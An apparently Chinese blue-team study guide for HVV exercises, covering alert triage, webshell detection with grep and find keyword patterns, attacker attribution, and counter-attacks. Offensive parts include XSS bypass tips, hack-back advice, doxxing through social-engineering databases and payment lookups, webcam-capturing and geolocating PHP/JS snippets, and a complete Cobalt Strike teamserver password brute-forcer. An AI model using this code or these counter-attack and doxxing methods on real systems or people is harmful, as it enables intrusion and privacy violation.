# hvv_蓝队溯源反制


HVV专题--蓝队溯源反制

<!--more-->

## 攻击研判

#### （1）怎么确定是真实攻击还是误报？

- 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报
- 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。
- 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。
- 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。

#### （2）cdn如何绕过？

1. 通过境外 ip 去平目标系统
2. 主动向我方的请求，如发邮件
3. 获取多个子域名 ip 对比
4. 查看 dns 记录
5. 通过网络搜索引擎去搜索

#### （3）常用的Webshell检测工具

- D盾
- 河马WEBSHELL
- Web shell Detector
- PHP Malware Finder

#### （4）struts2命令执行的流量特征

  一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。

#### （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？

- 一般webshell文件名后缀为jsp、php、py、asp等；
- 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。
- 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等
- 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。

#### （6）Liunx系统中任何权限都能访问的临时文件位置

   答：/var/tmp

#### （7）如何判断是钓鱼邮件

- 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。
- 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来
- 附件放到沙箱里 看看是否有问题
- 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了

#### （8）WAF和IPS的区别

  答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层   的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。

#### （9）拿到日志如何分析

1. 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析
2. 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征
3. 漏洞扫描检查
4. 可以匹配user-agent特征的方式进行检测
5. 暴力破解检测
6. webshell检测

#### （10）SQL注入有哪些常见的特征？

- **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等
- **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。

#### （11）XSS弹窗函数和常见的XSS绕过策略？

- **弹窗函数：**alert、confirm、prompt、onclick
- **绕过策略：**大小写混写；双写；<img/src=1>；%0a或者%0d绕过；拼凑绕过

#### （12）无文件Webshell实现的方式有哪些？

- 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell
- 基于特定框架，如 Spring 框架下动态注册 Controller 等。
- 基于 JAVA Agent，如 memShell

#### （13）响应状态码都有哪些？

 不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑）

- **404：**404 状态码表示请求资源不存在，即表示攻击失败；
- **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断

- **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。
- **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。
- **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。
- **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL.

#### （14）发现一个SQL注入告警怎么判断？

天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。

## 攻击源捕获：


发生[网络攻击](https://so.csdn.net/so/search?q=网络攻击&spm=1001.2101.3001.7020)事件的时候，我们应急响应的过程中，需要通过安全设备辅助，利用IDS/IPS/态势感知/蜜罐/沙箱甚至是全流量的告警辅助的手法去获取攻击者的信息，比如攻击者开始**攻击的时间**、**攻击的手法**、**利用的漏洞**、**攻击入口点**、是否在服务器里留下**后门**、**攻击者IP**，**被攻击主机**等，获取此类信息不仅仅是为了**后续的溯源取证**，也为了**后续的加固**

## 日志审计：

服务器的安全日志、web服务日志、数据库日志、安全设备相关日志（waf日志、安全软件日志等）

与流量分析，通过异常流量分析具体攻击行为、攻击手法、攻击源地址与目的地址

服务器异常捕获，异常的文件程序。非正常用户、恶意的外部通信、异常进程、端口、计划任务、启动项、注册表、快捷方式、隐藏文件等

## 网络攻击溯源：

可细分为**追踪溯源攻击主机**、**追踪溯源攻击控制主机**、**追踪溯源攻击者**、**追踪溯源攻击组织机构**

常用溯源分析方法包括**域名/IP地址分析**、**入侵日志监测**、**全流量分析**、**同源分析**、**攻击模型分析**

通过查询域名的**whois信息**，可以关联到攻击者部分信息，注册名，注册邮箱，注册地址，电话，注册时间，服务商等。

溯源的**一般会获取到几个相关信息**:攻击时间、攻击IP、攻击类型、恶意文件、受攻击的IP或域名。其中攻击IP、攻击类型、恶意文件、攻击详情是溯源分析的入手点。

通过攻击类型分析攻击详情的请求包，验证是否可以获取到攻击者相关信息，然后通过相关特征进行威胁情报查询来判断所用IP具体是代理的IP还是真实IP地址。

### 溯源流程：

##### 1、信息查询：

//威胁情报平台

https://x.threatbook.cn/			 	//微步X情报社区

https://ti.qianxin.com/					//奇安信威胁情报平台

https://ti.360.cn/						  	//360威胁情报平台

https://www.venuseye.com.cn/		//启明星辰威胁情报中心

https://community.riskiq.com/		//RiskIQ威胁情报平台

**//ip查域名**

https://www.ipip.net/ip.html			//IPIP平台

https://www.aizhan.com/				//爱站

https://www.whois.com/				//whois查询

**//IP定位**

https://chaipip.com/						//高精度IP定位

##### 2、定位目标：利用精准IP定位，进行IP目标位置的确定

##### 3、收集互联网信息侧的用户ID

可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。

##### 4、进入跳板机收集信息

如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等

### 邮件钓鱼攻击溯源：

钓鱼邮件攻击通常分为两种：一种带有**附件的word宏病毒**，一种是**引导受害者进入钓鱼网站**来获取受害者的敏感信息。

**获取信息：**通过查看**邮件原文**，获取发送方IP地址、域名后缀邮箱、钓鱼网站或恶意附件样本等信息

**对钓鱼网页的处理：**

- 可以通过相关联的域名/IP进行追踪；

- 对钓鱼网站进行反向渗透获取权限，进一步收集攻击者信息；


**对邮件附件的处理：**

- 对附件进行逆向，看附件是否包含红队物理路径信息，会暴露其用户名ID

- 把附件放进云沙箱，提取C2域名

- 邮件导出为eml格式，提取发信人IP

- 尽可能多的诱导对方提供攻击样本和链接

- 通过SIEM策略加快查找：

  同一个发件人，给超5个人发邮件的，筛出来

  同一个标题邮件，日志数超过10条的，筛出来

  所有对外公开的邮箱，逐一排查

  所有带附件的邮箱，考虑到免杀，再人工排查一遍

**获取到邮箱后：**

- WHOIS反查域名
- 邮箱前缀可能是红队ID，搜索引擎反查
- 天眼查、企查查反查公司
- reg007.com查注册过的网站，通过找回密码，进一步找信息

**获取到手机号后：**

- 查脉脉、领英，得到毕业院校、工作经历
- 查微博、知乎、github等社交账号
- 微信、支付宝转账，得到部分真实姓名
- 社工库查询

**拿到域名后：**

WHOIS反查注册人，要是开启了隐私保护，就查域名历史IP解析，然后根据查到的IP，再继续查IP历史解析域名，总之套娃。

## web入侵溯源：

**溯源方式：**隔离webshell样本，使用Web日志还原攻击路径，找到安全漏洞位置进行漏洞修复，从日志可以找到攻击者的IP地址，但攻击者一般都会使用代理服务器或匿名网络（例如Tor）来掩盖其真实的IP地址。

在入侵过程中，使用反弹shell、远程下载恶意文件、端口远程转发等方式，也容易触发威胁阻断，而这个域名/IP，提供一个反向信息收集和渗透测试的路径。



## 溯源反制：

#### IP定位法：

**未挂代理：**
直接获取真实IP，直接获取物理定位信息

**挂代理：**
①傀儡机进行跳板攻击
对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP

②使用http代理或VPN/TOR多级代理
如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧...)

#### 蜜罐捕获法：

利用蜜罐获取攻击者信息：

攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID

#### 常规渗透反打：

##### IP有服务：

IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等
通过现有的服务进行常规渗透测试，渗透服务器控制权限

##### IP无服务：

端口探测，常规漏洞攻击

## webshell溯源反制：

#### webshell查杀：

##### 工具查杀：

1、d盾：

http://www.d99net.net/

3、网站安全狗：

https://www.safedog.cn/website_safedog.html

3、百度webshell查杀引擎：

https://scanner.baidu.com/#/pages/intro

##### 手工查杀：

由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。

**1.上传目录关键字查找**
上传目录是最有可能存在websehll的，一般来说要优先排查上传目录

脚本代码排查：

```
grep -rn php upload/ 
```

关键字排查：
排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字

```
find /www/upload -name "*.php" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval\(|file_put_contents|base64_decode' 
```

**2.web非上传目录排查增删改查**

如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。

备份对比
对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析

```
vimdiff <(cd /tmp/1.1; find . | sort) <(cd /tmp/1.2; find . | sort) 
```

**3.时间戳排查**
根据情况调取短期内改动文件进行分析

```
find / -mtime -10 -mtime +1 2>/dev/null #一天前，十天内变动的文件 
```

**4.文件名排查**
使用tree命令列举整个web目录文件，然后排查可疑文件

```
tree /var/www/
```

**5.日志排查**

```
cat /var/log/apache2/access.log | grep "antSword"
```

#### webshell反打：

webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息
（只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的）

##### 获取照片：

```
<html>
  <head>
    <script>
      function takePhoto() {
        // 获取video元素
        const video = document.getElementById("video");

        // 创建一个canvas元素
        const canvas = document.createElement("canvas");

        // 设置canvas元素的大小
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // 将video图像画到canvas上
        canvas.getContext("2d").drawImage(video, 0, 0);

        // 将canvas元素转换为图片并显示
        const image = new Image();
        image.src = canvas.toDataURL("image/png");
        document.body.appendChild(image);
		
      }
    </script>
  </head>
  <body>
    <!-- 创建一个video元素 -->
    <video id="video" width="640" height="480" autoplay></video>

    <!-- 创建一个按钮，点击拍照 -->
    <button onclick="takePhoto()">Take Photo</button>

    <!-- 请求访问用户的摄像头 -->
    <script>
      // 创建一个MediaStream对象
      const stream = navigator.mediaDevices.getUserMedia({
        video: true
      });

      // 将MediaStream对象绑定到video元素上
      stream.then(function(mediaStream) {
        const video = document.getElementById("video");
        video.srcObject = mediaStream;
      });
    </script>
  </body>
</html>
```

##### 获取攻击者访问的时间、ip：

```
<?php
$ip = $_SERVER['REMOTE_ADDR'];
echo "Your IP address is: $ip";
$ip=get_real_ip();
    $dat=date('Y-m-d H:i:s',time());
        
        $a=$dat.' '.'文件名称:'.' IP:'.$ip."\n";
        $myfile=fopen("testfile.txt", "a+");
        fwrite($myfile, $a);
        fclose($myfile);
    
    function get_real_ip()
{
    $ip=FALSE;
    //客户端IP 或 NONE
    if(!empty($_SERVER["HTTP_CLIENT_IP"])){
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    }
    //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
        if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }
        for ($i = 0; $i < count($ips); $i++) {
            if (!eregi ("^(10│172.16│192.168).", $ips[$i])) {
                $ip = $ips[$i];
                break;
            }
        }
    }
    //客户端IP 或 (最后一个)代理服务器 IP
    return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}
?>
```

获取攻击者访问时间、ip后会在本地生成日志文件
![image-20230616003130699](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616003130699.png)

##### 获取经纬度：

```
<?php
echo $_SERVER['HTTP_HOST'];

$getIp=$_SERVER["REMOTE_ADDR"];
echo 'IP:',$getIp;
echo '<br/>';
$content = file_get_contents("http://api.map.baidu.com/location/ip?ak=自己去申请一个&ip={$getIp}&coor=bd09ll");
$json = json_decode($content);

echo 'log:',$json->{'content'}->{'point'}->{'x'};//按层级关系提取经度数据
echo '<br/>';
echo 'lat:',$json->{'content'}->{'point'}->{'y'};//按层级关系提取纬度数据
echo '<br/>';
print $json->{'content'}->{'address'};//按层级关系提取address数

echo $json->{'content'}->{'address_detail'}->{'city_code'};
print_r($json);
?>
```

样本逆向分析：
大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器

钓鱼邮件分析：
PDF信息获取等

## Cobalt Strike反制

在防守里面,必不可少的是钓鱼邮件,或者社工钓鱼,一般来说钓鱼的样本无非这几种,exe elf可执行文件,以及加了料的doc类宏木马,一般而言,目前红队主要是通过cobalt strike生成相关上线的shell 

1. 批量上线钓鱼马,启几百个进程mddos红方的cs端.假如我们获取到了红方的cs样本,那么第一种方法可以批量启几百个进程运行该样本(注意隔离环境),然后红方的cs端几乎瘫痪,无法使用

2. 爆破cs密码 一般而言,红队的cs设施为了多人运动,密码通常不会太复杂,很大机会是弱口令为主,甚至teamserver端口50050,那么针对cs端控制端,可以直接进行密码爆破

3. 假上线,我们只需要发送心跳包,即可模拟上线,并且攻击者无法执行命令.使用时更改换IP或域名、port、cookie

附CS爆破密码脚本

```python
#!/usr/bin/env python3

import time
import socket
import ssl
import argparse
import concurrent.futures
import sys

# csbrute.py - Cobalt Strike Team Server Password Brute Forcer

# https://stackoverflow.com/questions/6224736/how-to-write-python-code-that-is-able-to-properly-require-a-minimal-python-versi

MIN_PYTHON = (3, 3)
if sys.version_info < MIN_PYTHON:
    sys.exit("Python %s.%s or later is required.\n" % MIN_PYTHON)

parser = argparse.ArgumentParser()

parser.add_argument("host",
                    help="Teamserver address")
parser.add_argument("wordlist", nargs="?",
                    help="Newline-delimited word list file")
parser.add_argument("-p", dest="port", default=50050, type=int,
                    help="Teamserver port")
parser.add_argument("-t", dest="threads", default=25, type=int,
                    help="Concurrency level")

args = parser.parse_args()

# https://stackoverflow.com/questions/27679890/how-to-handle-ssl-connections-in-raw-python-socket


class NotConnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class DisconnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class Connector:
    def __init__(self):
        self.sock = None
        self.ssl_sock = None
        self.ctx = ssl.SSLContext()
        self.ctx.verify_mode = ssl.CERT_NONE
        pass

    def is_connected(self):
        return self.sock and self.ssl_sock

    def open(self, hostname, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.ssl_sock = self.ctx.wrap_socket(self.sock)

        if hostname == socket.gethostname():
            ipaddress = socket.gethostbyname_ex(hostname)[2][0]
            self.ssl_sock.connect((ipaddress, port))
        else:
            self.ssl_sock.connect((hostname, port))

    def close(self):
        if self.sock:
            self.sock.close()
        self.sock = None
        self.ssl_sock = None

    def send(self, buffer):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        self.ssl_sock.sendall(buffer)

    def receive(self):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        received_size = 0
        data_buffer = b""

        while received_size < 4:
            data_in = self.ssl_sock.recv()
            data_buffer = data_buffer + data_in
            received_size += len(data_in)

        return data_buffer


def passwordcheck(password):
    if len(password) > 0:
        result = None
        conn = Connector()
        conn.open(args.host, args.port)
        payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(
            bytes(password, "ascii").ljust(256, b"A"))
        conn.send(payload)
        if conn.is_connected(): result = conn.receive()
        if conn.is_connected(): conn.close()
        if result == bytearray(b"\x00\x00\xca\xfe"):
            return password
        else:
            return False
    else:
        print("Ignored blank password")

passwords = []

if args.wordlist:
    print("Wordlist: {}".format(args.wordlist))
    passwords = open(args.wordlist).read().split("\n")
else:
    print("Wordlist: {}".format("stdin"))
    for line in sys.stdin:
        passwords.append(line.rstrip())

if len(passwords) > 0:

    print("Word Count: {}".format(len(passwords)))
    print("Threads: {}".format(args.threads))

    start = time.time()

    # https://stackoverflow.com/questions/2846653/how-to-use-threading-in-python

    attempts = 0
    failures = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:

        future_to_check = {executor.submit(passwordcheck, password): password for password in passwords}
        for future in concurrent.futures.as_completed(future_to_check):
            password = future_to_check[future]
            try:
                data = future.result()
                attempts = attempts + 1
                if data:
                    print("Found Password: {}".format(password))
            except Exception as exc:
                failures = failures + 1
                print('%r generated an exception: %s' % (password, exc))

    print("Attempts: {}".format(attempts))
    print("Failures: {}".format(failures))
    finish = time.time()
    print("Seconds: {:.1f}".format(finish - start))
    print("Attemps per second: {:.1f}".format((failures + attempts) / (finish - start)))
else:
    print("Password(s) required")
```

## 针对dnslog的反制 

通过流量设备审计到他人的dnslog平台的url payload,那么针对他的url payload可以进行反制.一般而言,常见的dnslog平台,蓝队防守的时候可以对厂家爱你的dnslog平台进行屏蔽.那么针对自行搭建的dnslog平台有以下思路

dnslog反制,可以批量ping捕获到的dnslog,然后而已扰乱他自行搭建的,恶意制造各种垃圾dnslog数据,让他无法获取到有效的信息,直接让红队人员被迫抛弃一个红队基础设施.具体可以写一个脚本比如站长之家之类的进行批量平,进行探测存活

httplog反制同理,可以使用爬虫节点,批量进行request请求捕获的http url即可,这样红队的dnslog平台几乎彻底报废.

### 攻击者画像：

![image-20230616001146686](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616001146686.png)

### 常见红队被反杀的姿势

1. 使用个人工作pc,且浏览器里面保存了百度 163 sina等登录凭据,攻击对抗过程中踩到蓝队的蜜罐,被jsonp劫持漏洞捕获安全社交id,从而被溯源到了真实的姓名和所在公司
2. 可能是蓝队封禁ip太厉害的原因,红队个人或者团队,使用自己的网站进行vps进行扫描,vps上含有团伙组织https证书,或者vps ip绑定的域名跟安全社交id对应,从而被溯源到真实姓名和所在的公司
3. 部分攻击队写的扫描器payload里面含有攻击者的信息,如使用了私有的dnslog 攻击载荷里面含有安全社交id 含有个人博客资源请求等
4. 投递的钓鱼邮件里面的木马样本被蓝队采集,逆向 反控c2c 溯源到个人信息
5. 虚拟机逃逸打到实体机,暴露个人全部真实信息的

以下是狼蛛安全实验室的几篇溯源研究：

[溯源专题 |通过PDF文件信息进行攻击溯源](https://www.freebuf.com/articles/network/351431.html)

[溯源专题 | 通过时间与时区溯源](https://www.freebuf.com/articles/network/351348.html)

[溯源专题 | 通过lnk样本进行攻击溯源](https://www.freebuf.com/articles/network/349868.html)

[溯源专题 | 通过压缩文件溯源攻击者信息](https://www.freebuf.com/articles/network/341745.html)

[溯源专题 | 通过分析样本组合进行溯源](https://www.freebuf.com/articles/network/352952.html)

[溯源专题 | 通过PE中的“富签名”进行攻击溯源](https://www.freebuf.com/articles/network/349867.html)

【参考资料】：

网盾网络安全培训《webshell溯源排查与反制》

CSDN-vlan911《浅谈溯源反制与防溯源》

奇安信攻防社区-《【hvv2022】溯源反制案例学习笔记》

[红队基础建设:隐藏你的C2 server - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/4509)

https://xz.aliyun.com/t/8385

https://www.secrss.com/articles/27611

[防守反制--爆破CS Teamserver 密码](https://www.54cto.com/webaq/1101.html)

